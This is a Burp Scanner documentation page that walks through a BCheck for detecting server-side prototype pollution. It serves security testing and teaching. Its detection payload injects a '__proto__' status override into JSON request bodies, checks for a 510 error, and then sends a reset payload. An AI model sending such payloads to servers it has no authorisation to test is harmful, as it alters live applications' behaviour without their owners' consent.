# Example server-side prototype pollution check

Source: https://portswigger.net/burp/documentation/scanner/bchecks/worked-examples/server-side-prototype-pollution
Fetched: 2026-06-28T09:16:10.896518+00:00

Support Center

Documentation

Scanner

BCheck definitions

Worked examples

Example server-side prototype pollution check

DASTProfessional

Example server-side prototype pollution check

Last updated:

June 18, 2026

Read time:

3 Minutes

This BCheck tests for server-side prototype pollution. It works by attempting to pollute the status property of Object.prototype, changing the value of that property to a specific value.

metadata:

language: v2-beta

name: "Server-side prototype pollution"

description: "Server-side prototype pollution using the status technique"

author: "Gareth Heyes"

tags: "Server-Side Prototype Pollution"

define:

payload = `,"__proto__":\{"status\":510\}\}`

nullify = `,"__proto__":\{"status\":0\}\}`

issueDetail = "Server-Side Prototype Pollution was found on this web site."

issueRemediation = "Ensure that property keys, such as __proto__, constructor, and prototype are correctly filtered when merging objects. When creating objects, we recommend using the Object.create(null) API to ensure that your object does not inherit

from the Object.prototype and therefore won't be vulnerable to prototype pollution."

given request then

if {base.request.body} matches "^[{]" then

send request called inject_sspp:

method: "POST"

body: {regex_replace({base.request.body}, "[}]$", {payload})}

send request called check_sspp:

method: "POST"

body: "{,}"

if {latest.response.body} matches "\"statusCode\":510" or {latest.response.status_code} is "510" then

send request called clean_sspp:

method: "POST"

body: {regex_replace({base.request.body}, "[}]$", {nullify})}

send request called followup_check_sspp:

method: "POST"

body: "{,}"

if not({followup_check_sspp.response.body} matches "\"statusCode\":510" or {followup_check_sspp.response.status_code} is "510") then

report issue:

severity: high

confidence: firm

detail: `{issueDetail}`

remediation: `{issueRemediation}`

end if

end if

end if

Step 1: Add metadata

metadata:

language: v2-beta

name: "Server-side prototype pollution"

description: "Server-side prototype pollution using the status technique"

author: "Gareth Heyes"

tags: "Server-Side Prototype Pollution"

The definition starts with a metadata block. For more information on available metadata properties, see the reference documentation.

Step 2: Declare variables

define:

payload = `,"__proto__":\{"status\":510\}\}`

nullify = `,"__proto__":\{"status\":0\}\}`

issueDetail = "Server-Side Prototype Pollution was found on this web site."

issueRemediation = "Ensure that property keys, such as __proto__, constructor, and prototype are correctly filtered when merging objects. When creating objects, we recommend using the Object.create(null) API to ensure that your object does not inherit

from the Object.prototype and therefore won't be vulnerable to prototype pollution."

The next step is to declare the following variables:

payload attempts to pollute the prototype by changing its error status code to 510.

nullify changes the prototype's error status code to 0.

issueDetail defines informational text that can be called when required.

issueRemediation defines remediation text that can be called when required.

Step 3: Attempt to inject SSPP

given request then

if {base.request.body} matches "^[{]" then

send request called inject_sspp:

method: "POST"

body: {regex_replace({base.request.body}, "[}]$", {payload})}

The next step is to send the initial polluting request.

Burp Scanner first uses an if statement to check for JSON requests. Where it finds a JSON request (identified by an opening curly brace character), Burp Scanner sends a request that uses the regex_replace function to add the contents of the payload variable to the end of the JSON object.

Step 4: Force an error to check for SSPP

send request called check_sspp:

method: "POST"

body: "{,}"

The next step is to send a second request to test whether the prototype was successfully polluted. Burp Scanner does this by using an invalid JSON object to force an error.

Step 5: Evaluate results and send follow-up request

if {latest.response.body} matches "\"statusCode\":510" or {latest.response.status_code} is "510" then

send request called clean_sspp:

method: "POST"

body: {regex_replace({base.request.body}, "[}]$", {nullify})}

The next step is to evaluate the error response sent and potentially send a follow-up request.

Burp Scanner uses an if statement to check whether the response's status is now 510. If this is the case, then it sends a follow up request using the nullify variable to reset the status code to 0.

Step 6: Do a second check for SSPP

send request called followup_check_sspp:

method: "POST"

body: "{,}"

The next step is to send another request to check the object's status code. Again, Burp Scanner does this by using an invalid JSON object to force an error.

Step 7: Report issues

if not({followup_check_sspp.response.body} matches "\"statusCode\":510" or {followup_check_sspp.response.status_code} is "510") then

report issue:

severity: high

confidence: firm

detail: `{issueDetail}`

remediation: `{issueRemediation}`

The final step is to report issues where required.

Burp Scanner uses an if statement to check whether the object's status code is still 510. If it is not, it is likely that the prototype can be polluted. Burp Scanner reports an issue with firm confidence.

Test this BCheck

You can test this BCheck out on the Privilege escalation via server-side prototype pollution Web Security Academy lab.

Related pages

BCheck definition reference.
